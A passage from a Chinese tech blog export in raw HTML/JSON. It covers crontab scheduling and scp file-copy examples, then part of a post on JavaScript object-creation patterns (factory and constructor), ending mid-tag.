class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">45 4 1,10,22 * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例8：每周六、周日的1 : 10重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">10 1 * * 6,0 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0,30 18-23 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例10：每星期六的晚上11 : 00 pm重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">0 23 * * 6 /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例11：每一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* */1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<p>实例12：晚上11点到早上7点之间，每隔一小时重启smb<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">* 23-7/1 * * * /etc/init.d/smb restart</div></pre></td></tr></table></figure></p>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"#scp\"></a>#scp</h2><p>实例1：从远处复制文件到本地目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp root@10.6.159.147:/opt/soft/demo.tar /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/的目录中下载demo.tar 文件到本地/opt/soft/目录中</p>\n<p>实例2：从远处复制到本地<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r root@10.6.159.147:/opt/soft/<span class=\"built_in\">test</span> /opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>"},{"title":"JavaScript创建对象的七种模式","date":"2016-10-11T12:16:14.000Z","_content":"\n<section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把<span style=\"color: rgb(0, 128, 255);\">对象</span>定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，然后再为他添加属性和方法，如下所示：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102);\">Object</span>();、</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.name = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"liubei\"</span>;</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person.age = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 102, 102);\">29</span>;<br>person.job = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 136, 0);\">\"shayemuyou\"</span>;<br><br>person.sayName = <span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 12px; color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp;<br>&nbsp; alert(<span class=\"\" style=\"font-size: 12px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为<span style=\"color: rgb(0, 128, 255);\">person</span>的对象，并为他添加了三个属性和一个方法。其中<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法用于显示name属性，<span style=\"color: rgb(0, 128, 255);\">this.name</span>将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：</span></p></section><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person = {\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;name:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"liubei\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"shayemuyou\"</span>,\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span>\n <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"software\"</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{\n &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">\"software\"</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"alert(this.name);\"</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: 